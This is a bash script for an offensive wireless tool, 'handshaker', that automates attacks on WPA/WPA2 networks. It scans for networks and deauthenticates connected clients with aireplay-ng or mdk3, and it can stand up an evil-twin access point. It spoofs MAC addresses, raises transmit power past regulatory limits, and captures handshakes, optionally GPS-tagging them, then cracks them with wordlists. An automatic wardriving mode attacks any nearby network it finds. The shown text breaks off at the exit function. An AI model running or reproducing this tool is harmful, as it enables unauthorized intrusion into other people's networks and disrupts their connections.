#!/bin/bash

## Handshaker Copyright 2013, d4rkcat (rfarage@yandex.com)
#
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.
#
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License at (http://www.gnu.org/licenses/) for
## more details.

fhelp()																	#Help
{
	clear
	echo $RST""" 
handshaker - Detect, deauth, capture and crack WPA/2 handshakes. d4rkcat <rfarage@yandex.com>
             
	Usage: 	handshaker <Method> <Options>
	
	Method:
		-a - Autobot or Wardriving mode
		-e - Search for AP by partial unique ESSID
		-l - Scan for APs and present a target list
		-c - Crack handshake from pcap
		
	Options:
		-i  - Wireless Interface card
		-i2 - Second wireless card (better capture rate)
		-b  - Use Evil twin AP to capture handshakes
		-w  - Wordlist to use for cracking
		-d  - Deauth this many times for each AP (default 3)
		-p  - Only attack clients above this power level
		-o  - Save handshakes to custom directory
		-g  - Use android GPS to record AP location
		-t  - Timeout to wait for GPS at startup (default 2)
		-m  - Use mdk3 for deauth (default aireplay-ng)
		-s  - Silent
		-h  - This help
			
	Examples: 
		 handshaker -a -i wlan0 -d 5			 ~ Autobot mode on wlan0 and deauth 5 times.
		 handshaker -e Hub3-F -w wordlist.txt	 	 ~ Find AP like 'Hub3-F' and crack with wordlist.
		 handshaker -l -o out/dir			 ~ List all APs and save handshakes to out/dir.
		 handshaker -c handshake.cap -w wordlist.txt	 ~ Crack handshake.cap with wordlist.
"""
	exit
}

fstart()																#Startup
{
	COLOR="tput setab"
	COLOR2="tput setaf"
	RED=$(echo -e "\e[1;31m")
	BLU=$(echo -e "\e[1;36m")
	GRN=$(echo -e "\e[1;32m")
	RST=$(echo -e "\e[0;0;0m")
	LIST="""beep
bc
mdk3
gpsd 
cowpatty
pyrit"""	
	for COMMAND in $LIST
		do
			if [ $(which $COMMAND) -z ] 2> /dev/null
				then
					echo $RED" [*] $COMMAND not found, Installing..."
					if [ $(whoami) = "root" ]
						then
							apt-get install $COMMAND
							if [ $(which $COMMAND) -z ] 2> /dev/null
								then
									echo " [*] ERROR: $COMMAND could not be installed, please install manually"
								else
									echo $GRN" [*] $COMMAND Installed"
							fi
						else
							sudo apt-get install $COMMAND
							if [ $(which $COMMAND) -z ] 2> /dev/null
								then
									echo " [*] ERROR: $COMMAND could not be installed, please install manually"
									sleep 0.4
								else
									echo $GRN" [*] $COMMAND Installed"
							fi
					fi
			fi
		done
	clear
	if [ $CRACK = "1" ] 2> /dev/null
		then
			if [ -f $PCAP ] 2> /dev/null
				then
					fcrack
				else
					echo $RED;$COLOR2 9;$COLOR 1
					echo " [*] ERROR: There is no file at $PCAP. "$RST
					echo
					exit
			fi
	fi
	if [ $NIC2 -z ] 2> /dev/null
		then
			if [ $EVIL = 1 ] 2>/dev/null
				then
					echo $RED" [*]$GRN Evil twin$RED attack requires two wireless cards, turning it off..."
					EVIL=""
			fi
	fi
	if [ $OUTDIR -z ] 2> /dev/null
		then
			mkdir -p $HOME/Desktop/cap
			mkdir -p $HOME/Desktop/cap/handshakes
			OUTDIR=$HOME/Desktop/cap/handshakes
		else
			if [ $(echo $OUTDIR | tail -c 2) = '/' ] 2> /dev/null
				then
					OUTDIR=${OUTDIR:0:-1}
			fi
			mkdir -p $OUTDIR
	fi

	touch $OUTDIR/got
	MNUM=0
	if [ $DO -z ] 2> /dev/null
		then
			DO=E
	fi
	if [ $DO = 'E' ] 2> /dev/null
		then
			if [ $PARTIALESSID -z ] 2> /dev/null
				then	
					fhelp
			fi
	fi
	iw reg set BO
	if [ $GPS -z ] 2> /dev/null
		then		
			CHKILL=$(airmon-ng check kill | grep trouble)
			if [ $CHKILL -z ] 2> /dev/null
				then
					A=1
				else
					echo $RED" [*] $CHKILL"
					echo $GRN" [*] Killing all those processes..."
			fi
	fi
	MONS="$(ifconfig | grep mon | cut -d ' ' -f 1)"
	for MON in $MONS
		do
			airmon-ng stop $MON | grep removedgdan
		done
	if [ $NIC -z ] 2> /dev/null
		then
			clear
			$COLOR 4;echo $RED" [>] Which interface do you want to use?: ";$COLOR 9
			echo
			WLANS="$(ifconfig | grep wlan | cut -d ' ' -f 1)"
			for WLAN in $WLANS
				do
					echo " [>] $WLAN"
				done
			echo $BLU
			read -p "  > wlan" NIC
			NIC="wlan"$NIC
			echo
			echo $GRN;MON1=$(airmon-ng start $NIC | grep monitor | cut -d ' ' -f 5 | head -c -2);echo " [*] Started $NIC monitor on $MON1"
		else
			echo $GRN;MON1=$(airmon-ng start $NIC | grep monitor | cut -d ' ' -f 5 | head -c -2);echo " [*] Started $NIC monitor on $MON1"
	fi
	if [ $(ifconfig | grep $MON1) -z ] 2> /dev/null
		then
			echo $RED;$COLOR 1;$COLOR2 9;echo " [*] ERROR: $NIC card could not be started! "$RST
			fexit
	fi
	if [ $NIC2 -z ] 2> /dev/null
		then
			A=1
		else
			echo $GRN;MON2=$(airmon-ng start $NIC2 | grep monitor | cut -d ' ' -f 5 | head -c -2);echo " [*] Started $NIC2 monitor on $MON2"
			if [ $(ifconfig | grep $MON2) -z ] 2> /dev/null
				then
					echo $RED;$COLOR 1;$COLOR2 9;echo " [*] ERROR: $NIC2 card could not be started! "$RST
					fexit
			fi
	fi
	
	if [ $GPS = 1 ] 2> /dev/null
		then
			fstartgps
	fi
	
	if [ $DO = 'A' ] 2> /dev/null
		then
			echo $RST
			if [ $TRIES -z ] 2> /dev.null
			then
				TRIES=3
			fi
			fbotstart
	fi
	
	MONS="$(ifconfig | grep mon | cut -d ' ' -f 1)"
	echo
	echo $BLU" [*] Changing monitor device MAC addresses. "$GRN
	echo
	for MON in $MONS
		do
			ifconfig $MON down
			echo " [*] $(macchanger -a $MON | grep New | tr -d 'New' | sed 's/^ *//g')"
			echo " [*] $MON MAC address changed and power boosted. "
			iwconfig $MON txpower 30 2> /dev/null
			sleep 0.5			
			ifconfig $MON up
			echo
		done
	echo $RST
	
	if [ $DO = 'L' ] 2> /dev/null
		then
			flistap
		else
			fapscan
	fi
}

fapscan()																#Grep for AP ESSID
{
	clear
	gnome-terminal -t 'Scanning...' --geometry=100x20+0+320 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt WPA&
	echo $BLU" [*] Scanning for AP's with names like $GRN$PARTIALESSID$BLU [*] "$RST
	while [ $DONE -z ] 2> /dev/null
		do
			sleep 0.3
			if [ -f $HOME/tmp-01.csv ] 2> /dev/null
				then
					DONE=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID)
					ESSID=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 14 | head -n 1)
					BSSID=$(cat $HOME/tmp-01.csv | grep "$ESSID" | cut -d ',' -f 1 | head -n 1)
			fi
			if [ $ESSID -z ] 2> /dev/null
				then
					DONE=""
			fi
			if [ $BSSID -z ] 2> /dev/null
				then
					DONE=""
			fi
		done
	sleep 0.5
	killall airodump-ng
	ESSID=${ESSID:1}
	CHAN=$(cat $HOME/tmp-01.csv | grep "$ESSID" | cut -d ',' -f 4 | head -n 1)
	CHAN=$((CHAN + 1 - 1))
	fclientscan
}

flistap()																#List all APs
{
	gnome-terminal -t 'Scanning...' --geometry=100x20+0+320 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt WPA&
	clear
	echo $BLU" [*] Scanning for$GRN All APs$BLU, Please wait.. "$RED
	sleep 10
	killall airodump-ng
	echo "$(cat $HOME/tmp-01.csv | grep WPA | cut -d ',' -f 14)" > $HOME/tmp2
	LNUM=$(cat $HOME/tmp2 | wc -l)
	$COLOR 4;echo " [*] $LNUM APs found:"$GRN;$COLOR 9
	LNUM=0
	while read AP
		do
			LNUM=$((LNUM + 1))
			echo " [$LNUM] $AP"
		done < $HOME/tmp2

	echo $BLU" [>] Please choose an$GRN AP"
	read -p "  >" AP
	echo $RST
	ESSID=$(cat $HOME/tmp2 | sed -n "$AP"p)
	ESSID=${ESSID:1}
	BSSID=$(cat $HOME/tmp-01.csv | grep WPA | grep "$ESSID" | cut -d ',' -f 1)
	CHAN=$(cat $HOME/tmp-01.csv | grep WPA | grep "$ESSID" | cut -d ',' -f 4)
	CHAN=$((CHAN + 1 - 1))
	fclientscan
}

fclientscan()															#Find active clients
{
	CNT="0"
	clear
	echo -e $RED""" [*] Attacking:\t\t$GRN$ESSID$RED
 [*] BSSID:\t\t$GRN$BSSID$RED
 [*] Channel:\t\t$GRN$CHAN$RED"
	echo
	echo $BLU" [*] Please wait while I search for$GRN active clients$BLU.. [*] "
	DONE=""
	if [ $EVIL = 1 ] 2> /dev/null
		then
			CIPHER=$(cat $HOME/tmp-01.csv | grep $ESSID | cut -d ',' -f 7 | head -n1)
			CIPHER=${CIPHER:1}
			MIXED=$(echo $CIPHER | cut -d ' ' -f 2)
			CIPHER=$(echo $CIPHER | cut -d ' ' -f 1)
			WPA=$(cat $HOME/tmp-01.csv | grep $ESSID | cut -d ',' -f 6 | head -n1)
			WPA=${WPA:1}
			if [ $MIXED = $CIPHER ] 2> /dev/null
				then
					EVIL=1
				else
					echo $RED" [*] $GRN$ESSID$RED is Mixed CCMP/TKIP encryption,$GRN Evil Twin$RED is unlikely to work, turning it off"
					echo
					EVIL=""
			fi
	fi
	rm -rf $HOME/tmp* 2> /dev/null
	sleep 0.4
	if [ $EVIL -z ] 2> /dev/null
		then
			if [ $NIC2 -z ] 2> /dev/null
				then
					gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+320 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
				else
					gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
					gnome-terminal -t "$NIC2 Sniping $ESSID" --geometry=100x20+0+600 -x airodump-ng $MON2 --bssid $BSSID -c $CHAN -w $HOME/tmpe&
			fi
		else
			case $CIPHER in
				"CCMP")CIPHER=4;;
				"TKIP")CIPHER=2
			esac
			case $WPA in
				"WPA")BARG='-z ';;
				"WPA2")BARG='-Z '
			esac
			PART1=${RANDOM:0:2}
			gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
	fi
	
	while [ $CLIENT -z ] 2> /dev/null
		do
			sleep 0.5
			CLIENT=$(cat $HOME/tmp-01.csv 2> /dev/null | grep Station -A 20 | grep "$BSSID" | grep : | cut -d ',' -f 1 | head -n 1)
		done
	fautocap
}

fbotstart()																#Startup Autobot
{	
	MONS="$(ifconfig | grep mon | cut -d ' ' -f 1)"
	echo $BLU" [*] Changing monitor device MAC addresses. "
	echo $GRN
	for MON in $MONS
		do
			ifconfig $MON down
			echo " [*] $(macchanger -a $MON | grep New | tr -d 'New' | sed 's/^ *//g')"
			if [ $PWRCHK -z ] 2> /dev/null
				then
					echo " [*] $MON MAC address changed and power boosted. "
					iwconfig $MON txpower 30 2> /dev/null
					sleep 0.5
				else
					echo " [*] $MON MAC address changed "
			fi
			ifconfig $MON up
			echo
		done
	$COLOR 9
	if [ $PUTEVIL = 1 ] 2> /dev/null
		then
			EVIL=1
	fi
	clear
	echo $BLU" [>]$GRN AUTOBOT ENGAGED$BLU [<] "
	echo
	echo " [*]$GRN Scanning$BLU for new active clients.. ";$COLOR2 9
	gnome-terminal -t "$NIC Scanning.." --geometry=100x40+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt WPA&
	DONE=""
	PWRCHK=1;RESETCNT=1;MNUM=0;LNUM=0
	GOT=$(cat $OUTDIR/got);echo "$GOT" | sort -u > $OUTDIR/got
	CAPF=""
	modprobe pcspkr
	fautobot
}

fautobot()																#Automagically find new target clients
{	
	sleep 0.7
	if [ $RESETCNT -gt 80 ] 2> /dev/null
		then
			killall airodump-ng
			sleep 0.7
			rm -rf $HOME/tmp*
			gnome-terminal -t "$NIC Scanning.." --geometry=100x40+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt WPA&
			MNUM=0
			LNUM=0
			RESETCNT=1
	fi
			
	if [ ! -f $HOME/tmp-01.csv ] 2> /dev/null
		then
			sleep 1
			fautobot
	fi
	echo "$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep : | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -u)" > $HOME/tmp2
	if [ $(cat $HOME/tmp2) -z ] 2> /dev/null
		then
			RESETCNT=$((RESETCNT + 1))
			fautobot
	fi
	
	while read BSSID
		do
			if [ $BSSID -z ] 2> /dev/null
				then
					A=1
				else
					if [ $(cat $OUTDIR/got | grep "$BSSID") -z ] 2> /dev/null
						then
							if [ $BSSIDS2 -z ] 2> /dev/null
								then
									BSSIDS=$BSSID
									MCNT=1
								else
									BSSIDS="$BSSIDS\n$BSSID"
									MCNT=$((MCNT + 1))
							fi
					fi
				fi
		done < $HOME/tmp2
	
	if [ $BSSIDS -z ] 2> /dev/null
		then
			RESETCNT=$((RESETCNT + 1))
			fautobot
			
	fi

	if [ $MNUM -ge $MCNT ] 2> /dev/null
		then
			MNUM=0
	fi
	MNUM=$((MNUM + 1))
	BSSID=$(echo -e "$BSSIDS" | sed -n "$MNUM"p)
	if [ $BSSID -z ] 2> /dev/null
		then
			RESETCNT=$((RESETCNT + 1))
			fautobot
			
	fi
	CLIENT=$(cat $HOME/tmp-01.csv | grep Station -A 20 | grep "$BSSID" | cut -d ',' -f 1 | sed '/^$/d' | head -n 1)
	if [ $CLIENT -z ] 2> /dev/null
		then
			fautobot
	fi
	ESSID=$(cat $HOME/tmp-01.csv | grep "$BSSID" | cut -d ',' -f 14 | sed '/^$/d' | head -n 1)
	ESSID=${ESSID:1}
	if [ $ESSID -z ] 2>/dev/null
		then
			RESETCNT=$((RESETCNT + 1))
			fautobot
		else
			fpower
			if [ $POWERLIMIT -z ] 2> /dev/null
				then
					A=1
				else
					if [ $POWER -gt $POWERLIMIT ] 2> /dev/null
						then
							fautobot
					fi
			fi
			CHAN=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep WPA | cut -d ',' -f 4 | head -n 1)
			CHAN=$((CHAN + 1 - 1))
			if [[ $CHAN -gt 12 || $CHAN -lt 1 ]]
				then
					fautobot
			fi
			clear
			echo $RED" [>]$GRN AUTOBOT$RED LOCKED IN [<] "
			echo
			echo $GRN""" [*] Client found!:
 [*] ESSID: $ESSID
 [*] BSSID: $BSSID
 [*] Client: $CLIENT
 [*] Channel: $CHAN
 [*] Power: $POWER"""
			echo $RED" [*] We need this handshake [*] "$RST
			DEPASS=""
			if [ $EVIL = 1 ] 2> /dev/null
				then
					CIPHER=$(cat $HOME/tmp-01.csv | grep $ESSID | cut -d ',' -f 7 | head -n1)
					CIPHER=${CIPHER:1}
					MIXED=$(echo $CIPHER | cut -d ' ' -f 2)
					CIPHER=$(echo $CIPHER | cut -d ' ' -f 1)
					if [ $MIXED = $CIPHER ] 2> /dev/null
						then
							EVIL=1
						else
							echo
							echo $RED" [*] $GRN$ESSID$RED is Mixed CCMP/TKIP encryption,$GRN Evil Twin$RED is unlikely to work, turning it off"
							echo
							PUTEVIL=1
							EVIL=""
					fi
					WPA=$(cat $HOME/tmp-01.csv | grep $ESSID | cut -d ',' -f 6 | head -n1)
					WPA=${WPA:1}
			fi
			killall airodump-ng
			rm -rf $HOME/tmp*
			sleep 0.4
			if [ $EVIL -z ] 2> /dev/null
				then
					if [ $NIC2 -z ] 2> /dev/null
						then
							gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+320 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
						else
							gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
							gnome-terminal -t "$NIC2 Sniping $ESSID" --geometry=100x20+0+600 -x airodump-ng $MON2 --bssid $BSSID -c $CHAN -w $HOME/tmpe&
					fi
				else
					case $CIPHER in
						"CCMP")CIPHER=4;;
						"TKIP")CIPHER=2
					esac
					case $WPA in
						"WPA")BARG='-z ';;
						"WPA2")BARG='-Z '
					esac
					PART1=${RANDOM:0:2}
					gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
			fi
			fautocap
	fi
}
		
fautocap()																#Deauth targets and collect handshakes
{
	DONE="";CLINUM=1;DISPNUM=1;DECNT=0
	if [ $SILENT -z ] 2> /dev/null
		then
			beep -f 700 -l 25;beep -f 100 -l 100;beep -f 1200 -l 15;beep -f 840 -l 40;beep -f 1200 -l 15
	fi
	while [ $DONE -z ] 2> /dev/null
		do
			TARGETS="$(cat $HOME/tmp-01.csv | grep Station -A 20 | grep : | cut -d ',' -f 1 | sort -u)"
			if [ $DEPASS = "1" ] 2> /dev/null
				then
					if [ $POWERLIMIT -z ] 2> /dev/null
						then
							A=1
						else
							fpower
							if [ $POWER -gt $POWERLIMIT ] 2> /dev/null
								then
									sleep 1.3
									fautocap
							fi
					fi
							
					CLICNT=$(echo "$TARGETS" | wc -l)
					if [ $CLINUM -gt $CLICNT ] 2> /dev/null
						then
							CLINUM=1
							DISPNUM=1
					fi
					if [ $TARGETS -z ] 2> /dev/null
						then
							A=1
						else
							CLIENT=$(echo "$TARGETS" | sed -n "$CLINUM"p)
							DISPNUM=$CLINUM
					fi
					
			fi
			clear
			
			if [ $DO = 'A' ] 2> /dev/null
				then
					echo $RED" [>]$GRN AUTOBOT$RED LOCKED IN [<] ";echo
			fi
			echo -e $RED" [*] Target ESSID:\t\t $GRN$ESSID$RED\t\t Loaded [*] "
			echo -e $RED" [*] Target Client No.$GRN$DISPNUM:\t $CLIENT$RED\t Loaded [*]"$RST
			sleep 0.7
			if [ $TARGETS -z ] 2> /dev/null
				then
					TARGETS=$CLIENT
			fi
			if [ $NIC2 -z ] 2> /dev/null
				then
					echo $BLU;echo " [>] FIRE! [<] "
					if [ $MDK -z ] 2> /dev/null
						then
							MACNUM=0
							for CLIENT in $TARGETS
								do
									MACNUM=$((MACNUM + 1))
									echo
									aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1 | grep sdvds&
									sleep 1.8
									echo $RED" [*] $GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
									sleep 0.5
								done
							sleep 3
						else
							echo $BSSID > $HOME/BSSIDB
							gnome-terminal -t "mdk3 on $NIC" --geometry=60x20+720+320 -x mdk3 $MON1 d -b $HOME/BSSIDB&
							sleep 3 && killall mdk3 2> /dev/null&
							sleep 6
					fi
				else
					if [ $EVIL -z ] 2> /dev/null
						then
							if [ $MDK -z ] 2> /dev/null
								then
									echo $BLU;echo " [>] FIRE ON $NIC2! [<] "
									iw $MON2 set channel $CHAN
									MACNUM=0
									for CLIENT in $TARGETS
										do
											MACNUM=$((MACNUM + 1))
											echo
											aireplay-ng -0 3 -a $BSSID -c $CLIENT $MON2 | grep rvzsdb&
											sleep 2.8
											echo $RED" [*] $GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
											sleep 0.5
										done
									sleep 3
								else
									echo $BSSID > $HOME/BSSIDB
									gnome-terminal -t "MDK3 on $NIC2" --geometry=60x20+720+320 -x mdk3 $MON2 d -b $HOME/BSSIDB&
									sleep 5 && killall mdk3 2> /dev/null&
									sleep 8
							fi
						else
							if [ $CHKBASE -z ] 2> /dev/null
								then
									CHKBASE=1
							fi
							echo;echo $RED" [*]$GRN Evil Twin $ESSID$RED Launched on $GRN$NIC2" 
							echo $BLU;echo " [>] FIRE ON $NIC! [<] "
							FAKEMAC=${BSSID:0:12}'13:37'
							gnome-terminal -t "Evil Twin $ESSID listening on $NIC2.." --geometry=100x20+0+600 -x airbase-ng -v -c $CHAN -e $ESSID -W 1 $BARG$CIPHER -a $FAKEMAC -i $MON2 -I 50 -F $HOME/tmpe $MON2&
							sleep 2
							for CLIENT in $TARGETS
								do
									MACNUM=$((MACNUM + 1))
									echo
									aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1 | grep rvzsdb&
									sleep 1.8
									echo $RED" [*] $GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
								done
							sleep 6
					fi
					
			fi
			CLINUM=$((CLINUM + 1))
			echo
			echo $BLU" [*] Analyzing pcap for handshake [*] "$RST
			EDONE=""
			fanalyze
			DEPASS=1
			if [[ $DO = 'A' || $DEAU = "1" ]] 2> /dev.null
				then
					DECNT=$((DECNT + 1))
			fi
			if [ $GDONE = "1" ] 2> /dev/null
				then
					DONE=1
				else
					if [ $SILENT -z ] 2> /dev/null
						then
							beep -f 100 -l 100;beep -f 50 -l 100
					fi
					echo
					echo $RED" [*] No handshake detected [*] "$RST
					echo
					if [ $EVIL = 1 ] 2> /dev/null
						then
							killall airbase-ng
							rm -rf $HOME/tmpe-01.cap
					fi
					sleep 0.2
					DONE=""
					if [ $DECNT -ge $TRIES ] 2> /dev/null
						then
							if [ $DO = 'A' ] 2> /dev/null
								then
									killall airodump-ng
									if [ $EVIL = 1 ] 2> /dev/null
										then
											CHKBASE=""
											killall airbase-ng
									fi
									rm -rf $HOME/tmp*
									fbotstart
								else
									killall airodump-ng
									if [ $EVIL = 1 ] 2> /dev/null
										then
											CHKBASE=""
											killall airbase-ng
									fi
									fexit
							fi
					fi
			fi
					
		done

	echo
	killall airodump-ng
	if [ $SILENT -z ] 2> /dev/null
		then
			beep -f 1200 -l 3 -r 2;beep -f 1500 -l 3 -r 1;beep -f 1600 -l 5 -r 1;beep -f 1800 -l 3 -r 1;beep -f 1200 -l 3 -r 2;beep -f 1500 -l 3 -r 1;beep -f 1600 -l 5 -r 1;beep -f 1800 -l 3 -r 1
	fi
	echo $GRN" [*] Handshake capture was successful! [*] "
	echo
	ESSID=$(echo $ESSID | sed 's/ /_/g')
	CHKBASE=""
	DATE=$(date +%Y%m%d)
	if [ $EVIL = 1 ] 2> /dev/null
		then
			if [ $EDONE = 1 ] 2> /dev/null
				then
					killall airbase-ng
					mkdir -p $HOME/Desktop/cap/handshakes/cowpatty	
					cp $HOME/tmpe-01.cap $HOME/Desktop/cap/handshakes/cowpatty/$ESSID-$DATE.cap
					CAPF=$HOME/Desktop/cap/handshakes/cowpatty/$ESSID-$DATE.cap
					echo " [*] Handshake saved to$BLU $CAPF$GRN [*] "
				else
					killall airbase-ng
					echo " [*] Handshake saved to$BLU $OUTDIR/$ESSID-$DATE.cap$GRN [*] "
			fi
		else
			if [ $EDONE = 1 ] 2> /dev/null
				then
					cp $HOME/tmpe-01.cap $HOME/tmp-01.cap
			fi
			echo " [*] Handshake saved to$BLU $OUTDIR/$ESSID-$DATE.cap$GRN [*] "
	fi
	echo
	if [ $GPS = 1 ] 2> /dev/null
		then
			if [ $(cat $HOME/gpslog | grep LL) -z ] 2> /dev/null
				then
					echo $RED" [*] GPS Not ready yet!"
					echo
				else
					fgetgps
			fi
	fi
	if [ $EVIL = 1 ] 2> /dev/null
		then
			if [ $DO = 'A' ] 2> /dev/null
				then
					echo -e "$ESSID\tBSSID:$BSSID\tCH:$CHAN\t$LOCATION$URL" >> $OUTDIR/got
			fi
			echo -e "$ESSID\tBSSID:$BSSID\tCH:$CHAN\t$LOCATION$URL" >> $HOME/Desktop/cap/handshakes/cowpatty/got
		else
			echo -e "$ESSID\tBSSID:$BSSID\tCH:$CHAN\t$LOCATION$URL" >> $OUTDIR/got
			if [ $EDONE -z ] 2> /dev/null
				then
					echo $GRN" [*] $(pyrit -r $HOME/tmp-01.cap -o "$OUTDIR/$ESSID-$DATE.cap" strip | grep 'New pcap-file')"$RST
				else
					echo $GRN" [*] $(pyrit -r $HOME/tmpe-01.cap -o "$OUTDIR/$ESSID-$DATE.cap" strip | grep 'New pcap-file')"$RST
			fi
	fi
	sleep 0.4
	EDONE="";GDONE="";TARGETS="";BSSIDS=""
	echo
	rm -rf $HOME/tmp*
	sleep 2
	if [ $DO = 'A' ] 2> /dev.null
		then
			fbotstart
		else
			if [ $WORDLIST -z ] 2> /dev/null
				then
					echo $BLU" [>] Do you want to crack $GRN$ESSID$BLU now? [Y/n] "
					read -p "  >" DOCRK
					echo $RST
					case $DOCRK in
						"")fcrack;;
						"Y")fcrack;;
						"y")fcrack;;
					esac
					fexit
				else
					fcrack
			fi
	fi
}		

fanalyze()																#Analyze pcap for handshakes
{
	GDONE=""
	ANALYZE=$(cowpatty -r $HOME/tmp-01.cap -c)
	if [ $NIC2 -z ] 2> /dev/null
		then
			A=1
		else
			ANALYZE2=$(cowpatty -r $HOME/tmpe-01.cap -c)
			if  [ $(echo "$ANALYZE2" | grep Collected) -z ] 2> /dev/null
				then
					A=1
				else
					GDONE=1
					EDONE=1
			fi
	fi
	if  [ $(echo "$ANALYZE" | grep Collected) -z ] 2> /dev/null
		then
			A=2
		else 
			GDONE=1
	fi
	
}

fcrack()																#Crack handshakes
{
	clear
	if [ $WORDLIST -z ] 2> /dev/null
		then
			clear
			echo $BLU" [>] Please enter the full path of a wordlist to use. "
			read -e -p "  >"$RED WORDLIST
	fi
	if [ ! -f $WORDLIST ] 2> /dev/null
		then
			$COLOR 1;$COLOR2 9;echo " [*] ERROR: $WORDLIST not found, try again..";$COLOR 9
			WORDLIST=""
			sleep 1
			fcrack
		else
			if [ $CAPF -z ] 2> /dev/null
				then
					if [ $CRACK = "1" ] 2> /dev/null
						then
							echo $BLU
							aircrack-ng -q -w $WORDLIST $PCAP
							echo $RST
						else
							echo $BLU
							cowpatty -f $WORDLIST -s $ESSID -r $OUTDIR/$ESSID-$DATE".cap"
							echo $RST
					fi
				else
					echo $BLU;cowpatty -r $CAPF -s $ESSID -f $WORDLIST
					fexit
			fi
	fi
	fexit
}

fstartgps()																#Configure GPS
{
	if [ $TIMEOUT -z ] 2> /dev/null
		then
			TIMEOUT=2
	fi
	clear
	echo $GRN" [*] On your$RED android$GRN phone:"$BLU
	echo " [1] Enable GPS"
	echo " [2] Download BlueNMEA from the Google Play store and run it"
	echo " [3] Connect usb cable to laptop and enable usb tethering"
	echo
	echo $GRN" [*] On your$RED laptop$GRN:"$BLU
	echo " [1] Disconnect from any wifi "
	echo " [2] Turn any firewalls off"
	echo " [3] Connect to your phone AP"
	echo
	read -p $GRN"  >Press enter to continue once connected< "
	echo
	echo $BLU" [*] Checking GPS status"
	PHONEIP=$(route -n | grep Gate -A 1 | grep 0 | cut -d '0' -f 5 | sed 's/^ *//g')
	gpspipe -d -r "$PHONEIP:4352" -o $HOME/gpslog&
	sleep $TIMEOUT
	if [ $(cat $HOME/gpslog) -z ] 2> /dev/null
		then
			echo;$COLOR2 9;$COLOR 1;echo " [*] ERROR: Something went wrong, could not connect to android GPS server."$RST
			fexit
		else
			echo $RED" [>]$GRN SATALITE UPLINK ESTABLISHED$RED [<]"
			echo
			echo $GRN" [*] GPS tagging enabled!, co-ordinates will appear in $OUTDIR/got "
			sleep 2
	fi
}
	
fgetgps()
{
	LOCATION=$(cat $HOME/gpslog | grep LL | tail -1 | cut -d ',' -f 2-5)
	MINS1=$(echo $LOCATION | cut -d '.' -f 1 | tail -c 3)
	DEGS1=$(echo $LOCATION | cut -d '.' -f 1)
	DEGS1=${DEGS1:0:-2}
	SECSA="."$(echo $LOCATION | cut -d ',' -f 1 | cut -d '.' -f 2)
	SECS1=$(echo "$SECSA"*60 | bc)
	MINS2=$(echo $LOCATION | cut -d ',' -f 3 | cut -d '.' -f 1 | tail -c 3)
	DEGS2=$(echo $LOCATION | cut -d '.' -f 2 | cut -d ',' -f 3)
	DEGS2=${DEGS2:0:-2}
	SECSB="."$(echo $LOCATION | cut -d ',' -f 3 | cut -d '.' -f 2)
	SECS2=$(echo "$SECSB"*60 | bc)
	FIRST=$(echo $LOCATION | cut -d ',' -f 2)
	SECOND=$(echo $LOCATION | cut -d ',' -f 4)
	URL="nearby.org.uk/coord.cgi?p=$FIRST+$DEGS1%B0+$MINS1$SECSA+$SECOND+$DEGS2%B0+$MINS2$SECSB"
	DEGS1=$DEGS1'°'
	DEGS2=$DEGS2'°'
	case $FIRST in
		"N")FIRST='North';;
		"E")FIRST='East';;
		"S")FIRST='South';;
		"W")FIRST='West'
	esac
	
	case $SECOND in
		"N")SECOND='North';;
		"E")SECOND='East';;
		"S")SECOND='South';;
		"W")SECOND='West'
	esac
	
	echo """ [*] Current location:
 $RED[$GRN@$RED]$GRN $DEGS1 $RED$FIRST $GRN$MINS1$RED Minutes $GRN$SECS1$RED Seconds $GRN
 $RED[$GRN@$RED]$GRN $DEGS2 $RED$SECOND $GRN$MINS2$RED Minutes $GRN$SECS2$RED Seconds $GRN
 
 $RED[$GRN@$RED]$GRN Map URL: $URL
		"""
	LOCATION="$DEGS1 $FIRST $MINS1 Minutes $SECS1 Seconds, $DEGS2 $SECOND $MINS2 Minutes $SECS2 Seconds"
	URL=' - '$URL
}

fpower()																#Find power stats
{
	MACS="$(cat $HOME/tmp-01.csv | grep Station -A 20 | grep : | grep $CLIENT | cut -d ',' -f 4,6 | tr -d '(not associated)' | sed '/^$/d' | sort -u)" > $HOME/tmp3
	for MAC in $MACS
		do
			if [ $(echo $MAC | cut -d ',' -f 2) -z ] 2> /dev/null
				then
					A=1
				else
					if [ $PTARGETS -z ] 2> /dev/null
						then
							PTARGETS=$MAC
						else
							PTARGETS="$PTARGETS\n$MAC"
							MCNT=$((MCNT + 1))
					fi
			fi
		done
	POWER=$(echo -e "$PTARGETS" | grep "$BSSID" | head -n 1 | cut -d ',' -f 1)
	POWER=${POWER:1}
}

fexit()																	#Exit
{
	killall mdk3 2> /dev/null
